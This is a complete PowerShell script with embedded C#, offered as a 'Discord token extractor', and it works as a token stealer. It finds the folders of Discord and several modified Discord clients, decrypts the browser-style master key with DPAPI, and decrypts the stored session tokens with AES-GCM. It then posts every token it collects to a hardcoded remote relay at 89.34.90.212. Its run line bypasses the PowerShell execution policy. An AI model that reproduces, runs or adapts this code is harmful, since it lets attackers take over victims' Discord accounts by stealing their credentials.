# Discord token extractor (Windows, local Discord client only)
# Run: powershell -ExecutionPolicy Bypass -File .\angel.ps1

param(
    [string]$RelayUrl = "http://89.34.90.212:8000/text"
)

function Send-ToRelay {
    param([string]$Message)

    try {
        $r = Invoke-RestMethod -Uri $RelayUrl -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return ($r.ok -eq $true)
    }
    catch {
        return $false
    }
}

if (-not ([System.Management.Automation.PSTypeName]'DiscordCryptoHelper').Type) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public static class DiscordCryptoHelper
{
    private static readonly Regex UserTokenRe = new Regex(
        @"^[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50}$",
        RegexOptions.Compiled);
    private static readonly Regex MfaTokenRe = new Regex(
        @"^mfa\.[A-Za-z0-9_-]{84,}$",
        RegexOptions.Compiled);
    private static readonly Regex TokenFindRe = new Regex(
        @"(?:mfa\.[A-Za-z0-9_-]{84,}|[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50})",
        RegexOptions.Compiled);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DataBlob
    {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct BcryptAuthInfo : IDisposable
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;

        public BcryptAuthInfo(byte[] nonce, byte[] tag)
        {
            cbSize = Marshal.SizeOf(typeof(BcryptAuthInfo));
            dwInfoVersion = 1;
            pbNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, pbNonce, nonce.Length);
            cbNonce = nonce.Length;
            pbAuthData = IntPtr.Zero;
            cbAuthData = 0;
            pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, pbTag, tag.Length);
            cbTag = tag.Length;
            pbMacContext = IntPtr.Zero;
            cbMacContext = 0;
            cbAAD = 0;
            cbData = 0;
            dwFlags = 0;
        }

        public void Dispose()
        {
            if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
            if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
        }
    }

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CryptUnprotectData(
        ref DataBlob dataIn,
        IntPtr ppszDataDescr,
        IntPtr optionalEntropy,
        IntPtr reserved,
        IntPtr promptStruct,
        int flags,
        ref DataBlob dataOut);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptOpenAlgorithmProvider(
        out IntPtr phAlgorithm,
        string pszAlgId,
        string pszImplementation,
        uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptSetProperty(
        IntPtr hObject,
        string pszProperty,
        byte[] pbInput,
        int cbInput,
        uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptGenerateSymmetricKey(
        IntPtr hAlgorithm,
        out IntPtr phKey,
        IntPtr pbKeyObject,
        int cbKeyObject,
        byte[] pbSecret,
        int cbSecret,
        uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern uint BCryptDecrypt(
        IntPtr hKey,
        byte[] pbInput,
        int cbInput,
        ref BcryptAuthInfo pPaddingInfo,
        byte[] pbIV,
        int cbIV,
        byte[] pbOutput,
        int cbOutput,
        out int pcbResult,
        uint flags);

    [DllImport("bcrypt.dll")]
    private static extern uint BCryptDestroyKey(IntPtr hKey);

    public static byte[] Unprotect(byte[] encryptedKey)
    {
        if (encryptedKey == null || encryptedKey.Length == 0)
            return null;

        var input = new DataBlob();
        input.pbData = Marshal.AllocHGlobal(encryptedKey.Length);
        input.cbData = encryptedKey.Length;
        Marshal.Copy(encryptedKey, 0, input.pbData, encryptedKey.Length);

        var output = new DataBlob();
        try
        {
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                return null;

            var result = new byte[output.cbData];
            Marshal.Copy(output.pbData, result, 0, output.cbData);
            return result;
        }
        finally
        {
            if (input.pbData != IntPtr.Zero) Marshal.FreeHGlobal(input.pbData);
            if (output.pbData != IntPtr.Zero) Marshal.FreeHGlobal(output.pbData);
        }
    }

    public static byte[] GetMasterKey(byte[] encryptedKey)
    {
        if (encryptedKey == null || encryptedKey.Length < 5)
            return null;

        byte[] blob = encryptedKey;
        if (encryptedKey.Length > 5 &&
            encryptedKey[0] == 0x44 && encryptedKey[1] == 0x50 &&
            encryptedKey[2] == 0x41 && encryptedKey[3] == 0x50 && encryptedKey[4] == 0x49)
        {
            blob = new byte[encryptedKey.Length - 5];
            Array.Copy(encryptedKey, 5, blob, 0, blob.Length);
        }

        var key = Unprotect(blob);
        if (key == null && blob != encryptedKey)
            key = Unprotect(encryptedKey);
        if (key == null)
            return null;

        if (key.Length > 32)
        {
            var trimmed = new byte[32];
            Array.Copy(key, trimmed, 32);
            return trimmed;
        }
        return key;
    }

    public static bool IsValidToken(string token)
    {
        if (string.IsNullOrWhiteSpace(token))
            return false;

        token = token.Trim();
        for (int i = 0; i < token.Length; i++)
        {
            if (token[i] > 127)
                return false;
        }

        if (token.StartsWith("eJ") || token.StartsWith("eN") || token.StartsWith("H4s"))
            return false;

        if (MfaTokenRe.IsMatch(token))
            return true;

        if (!UserTokenRe.IsMatch(token))
            return false;

        string uidB64 = token.Split('.')[0];
        byte[] raw;
        try
        {
            raw = FromBase64Flexible(uidB64);
        }
        catch
        {
            return false;
        }
        if (raw == null)
            return false;

        string uid;
        try
        {
            uid = Encoding.ASCII.GetString(raw);
        }
        catch
        {
            return false;
        }

        ulong id;
        if (uid.Length < 16 || uid.Length > 20 || !ulong.TryParse(uid, out id))
            return false;

        ulong ts = (id >> 22) + 1420070400000UL;
        ulong now = (ulong)DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
        if (ts < 1420070400000UL || ts > now + 365UL * 24UL * 3600UL * 1000UL)
            return false;

        return true;
    }

    public static string FindFirstValidToken(string text)
    {
        if (string.IsNullOrEmpty(text))
            return null;
        text = text.Trim().Trim('\0').Trim().Trim('"');
        if (IsValidToken(text))
            return text;
        foreach (Match m in TokenFindRe.Matches(text))
        {
            if (IsValidToken(m.Value))
                return m.Value;
        }
        return null;
    }

    public static byte[] FromBase64Flexible(string value)
    {
        if (string.IsNullOrEmpty(value))
            return null;

        var sb = new StringBuilder(value.Length);
        for (int i = 0; i < value.Length; i++)
        {
            char c = value[i];
            if (c == '-') c = '+';
            else if (c == '_') c = '/';
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=')
                sb.Append(c);
        }

        string s = sb.ToString().TrimEnd('=');
        int pad = (4 - (s.Length % 4)) % 4;
        if (pad > 0) s += new string('=', pad);
        if (s.Length < 4)
            return null;

        try
        {
            return Convert.FromBase64String(s);
        }
        catch
        {
            return null;
        }
    }

    public static string DecryptToken(byte[] masterKey, byte[] encrypted)
    {
        if (encrypted == null || encrypted.Length < 16 || masterKey == null || masterKey.Length == 0)
            return null;

        if (masterKey.Length > 32)
        {
            var k = new byte[32];
            Array.Copy(masterKey, k, 32);
            masterKey = k;
        }

        if (encrypted.Length >= 31 && encrypted[0] == (byte)'v' && encrypted[1] == (byte)'1' &&
            (encrypted[2] == (byte)'0' || encrypted[2] == (byte)'1' || encrypted[2] == (byte)'2'))
        {
            var nonce = new byte[12];
            var tag = new byte[16];
            var cipher = new byte[encrypted.Length - 31];
            Array.Copy(encrypted, 3, nonce, 0, 12);
            Array.Copy(encrypted, encrypted.Length - 16, tag, 0, 16);
            Array.Copy(encrypted, 15, cipher, 0, cipher.Length);

            var plain = DecryptAesGcm(masterKey, nonce, cipher, tag);
            if (plain != null)
                return Encoding.UTF8.GetString(plain).TrimEnd('\0').Trim().Trim('"');
        }

        var legacy = Unprotect(encrypted);
        if (legacy == null)
            return null;
        return Encoding.UTF8.GetString(legacy).TrimEnd('\0').Trim().Trim('"');
    }

    public static string DecryptTokenB64(byte[] masterKey, string b64)
    {
        var enc = FromBase64Flexible(b64);
        if (enc == null)
            return null;
        return DecryptToken(masterKey, enc);
    }

    private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] cipher, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        BcryptAuthInfo auth = new BcryptAuthInfo(nonce, tag);

        try
        {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0)
                return null;

            var gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", gcmMode, gcmMode.Length, 0) != 0)
                return null;

            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0)
                return null;

            var output = new byte[cipher.Length];
            int resultSize;
            if (BCryptDecrypt(hKey, cipher, cipher.Length, ref auth, null, 0, output, output.Length, out resultSize, 0) != 0)
                return null;

            if (resultSize != output.Length)
            {
                var trimmed = new byte[resultSize];
                Array.Copy(output, trimmed, resultSize);
                return trimmed;
            }

            return output;
        }
        finally
        {
            auth.Dispose();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
'@
}

function Read-SharedFileBytes {
    param([string]$Path)

    try {
        $fs = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
        )
        try {
            if ($fs.Length -le 0) { return [byte[]]@() }
            $bytes = New-Object byte[] $fs.Length
            $offset = 0
            while ($offset -lt $bytes.Length) {
                $n = $fs.Read($bytes, $offset, $bytes.Length - $offset)
                if ($n -le 0) { break }
                $offset += $n
            }
            return $bytes
        }
        finally {
            $fs.Dispose()
        }
    }
    catch {
        return $null
    }
}

function Get-SearchTexts {
    param([byte[]]$Bytes)

    if ($null -eq $Bytes -or $Bytes.Length -eq 0) { return @() }

    $ascii = [System.Text.Encoding]::GetEncoding(28591).GetString($Bytes)
    $noNull = $ascii.Replace([char]0, '')

    $texts = New-Object System.Collections.Generic.List[string]
    [void]$texts.Add($ascii)
    if ($noNull -ne $ascii) {
        [void]$texts.Add($noNull)
    }

    if (($Bytes.Length % 2) -eq 0 -and $Bytes.Length -ge 2) {
        try {
            $utf16 = [System.Text.Encoding]::Unicode.GetString($Bytes)
            if (-not [string]::IsNullOrEmpty($utf16)) {
                [void]$texts.Add($utf16)
            }
        }
        catch { }
    }

    return $texts
}

function Add-ValidToken {
    param(
        [string]$Candidate,
        [System.Collections.Generic.HashSet[string]]$Found
    )

    if ([string]::IsNullOrWhiteSpace($Candidate)) { return }
    $token = [DiscordCryptoHelper]::FindFirstValidToken($Candidate)
    if ($token) {
        [void]$Found.Add($token)
    }
}

function Add-TokensFromText {
    param(
        [string]$Raw,
        [byte[]]$MasterKey,
        [System.Collections.Generic.HashSet[string]]$Found
    )

    if ([string]::IsNullOrEmpty($Raw)) { return }

    $tokenRe = [regex]'(?:mfa\.[A-Za-z0-9_-]{84,}|[A-Za-z0-9_-]{17,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,50})'
    foreach ($m in $tokenRe.Matches($Raw)) {
        Add-ValidToken -Candidate $m.Value -Found $Found
    }

    if (-not $MasterKey) { return }

    $encRe = [regex]'dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{60,400})'
    foreach ($m in $encRe.Matches($Raw)) {
        try {
            $dec = [DiscordCryptoHelper]::DecryptTokenB64($MasterKey, $m.Groups[1].Value)
            Add-ValidToken -Candidate $dec -Found $Found
        }
        catch { }
    }

    $jsonEncRe = [regex]'(?i)"(?:token|tokens|accessToken|access_token)"\s*:\s*"([^"]{20,400})"'
    foreach ($m in $jsonEncRe.Matches($Raw)) {
        $val = $m.Groups[1].Value
        if ($val -like 'dQw4w9WgXcQ:*') {
            $b64 = $val.Substring(13)
            try {
                $dec = [DiscordCryptoHelper]::DecryptTokenB64($MasterKey, $b64)
                Add-ValidToken -Candidate $dec -Found $Found
            }
            catch { }
        }
        else {
            Add-ValidToken -Candidate $val -Found $Found
        }
    }
}

function Get-TokensFromLevelDb {
    param(
        [string]$LevelDbPath,
        [byte[]]$MasterKey = $null
    )

    $found = [System.Collections.Generic.HashSet[string]]::new()
    $files = @(
        Get-ChildItem -Path $LevelDbPath -File -Filter *.ldb -ErrorAction SilentlyContinue
        Get-ChildItem -Path $LevelDbPath -File -Filter *.log -ErrorAction SilentlyContinue
        Get-ChildItem -Path $LevelDbPath -File -Filter LOG -ErrorAction SilentlyContinue
    )

    foreach ($file in $files) {
        $bytes = Read-SharedFileBytes -Path $file.FullName
        if ($null -eq $bytes) { continue }
        foreach ($raw in (Get-SearchTexts -Bytes $bytes)) {
            Add-TokensFromText -Raw $raw -MasterKey $MasterKey -Found $found
        }
    }

    return $found
}

function Get-MasterKeyFromLocalState {
    param([string]$LocalStatePath)

    $bytes = Read-SharedFileBytes -Path $LocalStatePath
    if ($null -eq $bytes -or $bytes.Length -eq 0) { return $null }

    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
    $keyB64 = $null

    try {
        $json = $text | ConvertFrom-Json
        if ($json.os_crypt.encrypted_key) {
            $keyB64 = [string]$json.os_crypt.encrypted_key
        }
    }
    catch { }

    if (-not $keyB64) {
        $m = [regex]::Match($text, '"encrypted_key"\s*:\s*"([^"]+)"')
        if ($m.Success) { $keyB64 = $m.Groups[1].Value }
    }

    if (-not $keyB64) { return $null }

    try {
        $encKey = [DiscordCryptoHelper]::FromBase64Flexible($keyB64)
        return [DiscordCryptoHelper]::GetMasterKey($encKey)
    }
    catch {
        return $null
    }
}

function Get-DiscordRoots {
    $candidates = @(
        "$env:APPDATA\Discord"
        "$env:APPDATA\discord"
        "$env:APPDATA\DiscordCanary"
        "$env:APPDATA\discordcanary"
        "$env:APPDATA\DiscordPTB"
        "$env:APPDATA\discordptb"
        "$env:APPDATA\DiscordDevelopment"
        "$env:APPDATA\Lightcord"
        "$env:APPDATA\lightcord"
        "$env:APPDATA\Vesktop"
        "$env:APPDATA\vesktop"
        "$env:APPDATA\Legcord"
        "$env:APPDATA\legcord"
        "$env:APPDATA\ArmCord"
        "$env:APPDATA\armcord"
        "$env:LOCALAPPDATA\Discord"
        "$env:LOCALAPPDATA\discord"
        "$env:LOCALAPPDATA\DiscordCanary"
        "$env:LOCALAPPDATA\DiscordPTB"
    )

    $seen = @{}
    $roots = @()

    foreach ($path in $candidates) {
        if (-not (Test-Path $path)) { continue }
        try {
            $resolved = (Resolve-Path $path).Path
            $key = $resolved.ToLowerInvariant()
        }
        catch { continue }

        if ($seen.ContainsKey($key)) { continue }
        $seen[$key] = $true
        $roots += $resolved
    }

    return $roots
}

function Get-StorageDirs {
    param([string]$Root)

    $dirs = New-Object System.Collections.Generic.List[string]
    $seen = @{}

    function Add-Dir([string]$Path) {
        if (-not $Path -or -not (Test-Path $Path)) { return }
        $key = $Path.ToLowerInvariant()
        if ($seen.ContainsKey($key)) { return }
        $seen[$key] = $true
        [void]$dirs.Add($Path)
    }

    Add-Dir (Join-Path $Root "Local Storage\leveldb")
    Add-Dir (Join-Path $Root "Session Storage")

    $idb = Join-Path $Root "IndexedDB"
    if (Test-Path $idb) {
        Get-ChildItem $idb -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Name -match 'leveldb') {
                Add-Dir $_.FullName
            }
            Get-ChildItem $_.FullName -Directory -Filter "*leveldb*" -ErrorAction SilentlyContinue | ForEach-Object {
                Add-Dir $_.FullName
            }
        }
    }

    return $dirs
}

$allTokens = [System.Collections.Generic.HashSet[string]]::new()

foreach ($root in (Get-DiscordRoots)) {
    $masterKey = $null
    $localState = Join-Path $root "Local State"
    if (Test-Path $localState) {
        $masterKey = Get-MasterKeyFromLocalState -LocalStatePath $localState
    }

    foreach ($storagePath in (Get-StorageDirs -Root $root)) {
        $tokens = Get-TokensFromLevelDb -LevelDbPath $storagePath -MasterKey $masterKey
        foreach ($t in $tokens) { [void]$allTokens.Add($t) }
    }
}

if ($allTokens.Count -eq 0) {
    exit 1
}

$msg = ($allTokens | ForEach-Object { $_ }) -join "`n"
Send-ToRelay -Message $msg | Out-Null
exit 0
